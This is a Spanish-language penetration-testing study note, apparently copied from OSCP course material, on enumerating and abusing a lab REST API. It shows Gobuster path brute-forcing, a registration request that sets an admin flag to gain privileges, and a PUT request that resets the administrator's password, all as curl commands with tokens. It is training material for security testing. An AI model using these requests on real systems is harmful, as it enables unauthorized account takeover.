---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Enumeración y Abuso de APIs

En muchos casos, nuestro objetivo de prueba de penetración es una aplicación web de origen cerrado, construida internamente y que se suministra con una serie de Interfaces de Programación de Aplicaciones (API). Estas APIs son responsables de interactuar con la lógica del back-end y proporcionar una base sólida de funciones para la aplicación web.

Un tipo específico de API llamado Representational State Transfer (REST) se utiliza para una variedad de propósitos, incluida la autenticación.

En un escenario típico de prueba de caja blanca, recibiríamos documentación completa de la API para ayudarnos a mapear completamente la superficie de ataque. Sin embargo, al realizar una prueba de caja negra, tendremos que descubrir la API del objetivo nosotros mismos.

\
**Enumeración y Ataque de APIs con Gobuster**

Podemos utilizar las características de Gobuster para realizar un ataque de fuerza bruta en los puntos finales de la API. En este escenario de prueba, nuestro servidor web de la puerta de enlace de la API está escuchando en el puerto 5001 en la dirección IP 192.168.50.16, por lo que podemos intentar un ataque de fuerza bruta en directorios.

Las rutas de la API a menudo van seguidas de un número de versión, resultando en un patrón como: `/api_nombre/v1`&#x20;

### **Convención de Nomenclatura de Rutas de la API**

El nombre de la API suele ser bastante descriptivo sobre la función o los datos que utiliza para operar, seguido directamente por el número de versión.

Con esta información, intentemos realizar un ataque de fuerza bruta en las rutas de la API utilizando una lista de palabras junto con la función de patrones de Gobuster. Podemos llamar a esta función utilizando la opción `-p` y proporcionando un archivo con patrones. Para nuestra prueba, crearemos un archivo de patrones simple en nuestro sistema Kali que contenga el siguiente texto:

```bash
{GOBUSTER}/v1
{GOBUSTER}/v2
```

### **Patrón de Gobuster**

En este ejemplo, estamos utilizando el marcador de posición "{GOBUSTER}" para que coincida con cualquier palabra de nuestra lista de palabras, que se añadirá con el número de versión. Para mantener nuestra prueba simple, probaremos solo con dos versiones.

Ahora estamos listos para enumerar la API con Gobuster usando el siguiente comando:

```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

### **Enumeración de Rutas de la API con Gobuster**

**Acceso a la Documentación Completa de las APIs**

Aunque esto es común durante las pruebas de caja blanca, no es un lujo que normalmente tengamos durante una prueba de caja negra.

Primero, inspeccionemos la API `/users` con curl.

```bash
curl -i http://192.168.50.16:5002/users/v1
```

**Obtención de Información de Usuarios**

La aplicación devolvió tres cuentas de usuario, incluida una cuenta administrativa que parece valer la pena investigar más a fondo. Podemos utilizar esta información para intentar otro ataque de fuerza bruta con Gobuster, esta vez apuntando al usuario administrador con una lista de palabras más pequeña. Para verificar si alguna propiedad adicional de la API está relacionada con la propiedad del nombre de usuario, ampliaremos la ruta de la API insertando el nombre de usuario admin al final.

```bash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

**Ataque de Fuerza Bruta Adicional en la Propiedad de Usuario Administrador**

Hemos iniciado Gobuster para realizar una enumeración de directorios en la ruta ampliada de la API. Este ataque puede ayudarnos a descubrir posibles propiedades o recursos adicionales relacionados con el usuario administrador.

El camino de la API de contraseñas parece atractivo para nuestros propósitos de prueba, así que lo probaremos mediante curl.

```bash
curl -i http://192.168.50.16:5002/users/v1/admin/password
```

Se puede hacer varias pruebas a una api para descubrir varias rutas o informacion relevante.

#### Mas ejemplos

La ruta de la API de contraseñas parece atractiva para nuestros propósitos de prueba, así que la exploraremos mediante curl.

```bash
curl -i http://192.168.50.16:5002/users/v1/admin/password
```

Podemos comprobar si el método de inicio de sesión es compatible ampliando nuestra URL base de la siguiente manera:

```bash
curl -i http://192.168.50.16:5002/users/v1/login
```

Sabemos que uno de los nombres de usuario es "admin", así que podemos intentar iniciar sesión con este nombre de usuario y una contraseña ficticia para verificar que nuestra estrategia tiene sentido.

A continuación, intentaremos convertir la anterior solicitud GET en una solicitud POST y proporcionaremos nuestro payload en el formato JSON356 requerido. Construyamos nuestra solicitud pasando primero el nombre de usuario "admin" y una contraseña ficticia como datos JSON a través del parámetro -d. También especificaremos "json" como el "Content-Type" al especificar una nueva cabecera con -H.

```bash
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type:
application/json' http://192.168.50.16:5002/users/v1/login

```

Intentemos registrar un nuevo usuario con la siguiente sintaxis, agregando una estructura de datos JSON que especifique el nombre de usuario y la contraseña deseados:

```bash
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: 
application/json' http://192.168.50.16:5002/users/v1/register
```

Podríamos aprovechar determinar si hay alguna clave administrativa que podamos abusar. Agreguemos la clave "admin", seguida de un valor True.

```bash
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: 
application/json' http://192.168.50.16:5002/users/v1/register
```

A continuación, intentemos iniciar sesión con las credenciales que acabamos de crear al invocar la API de inicio de sesión que descubrimos anteriormente.

```bash
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: 
application/json' http://192.168.50.16:5002/users/v1/login
{"auth_token":
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwi
c3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message":
"Successfully logged in.", "status": "success"}
```

Recibimos un token de autenticación exitosa, indicando que hemos iniciado sesión con éxito.

Para obtener una prueba tangible de que somos un usuario administrativo, deberíamos usar este token para cambiar la contraseña del usuario administrador.

Podemos intentar esto forjando una solicitud POST que apunte a la API de contraseñas.

```bash
curl \ 'http://192.168.50.16:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic
3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
-d '{"password": "pwned"}'
```

El método PUT (junto con PATCH) se utiliza a menudo para reemplazar un valor en lugar de crear uno mediante una solicitud POST, así que intentemos definirlo explícitamente a continuación:

```bash
curl -X 'PUT' \
'http://192.168.50.16:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
-d '{"password": "pwned"}'
```

Para demostrar que nuestro ataque tuvo éxito, podemos intentar iniciar sesión como administrador utilizando la contraseña recién cambiada.

```bash
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type:
application/json' http://192.168.50.16:5002/users/v1/login
```

Son algunos ejemplos sacado de un pfd de OSCP.

Tener en cuenta que estos test se pueden realizar con otras herramientas como burt suite o postman,existen muchas alternativas.
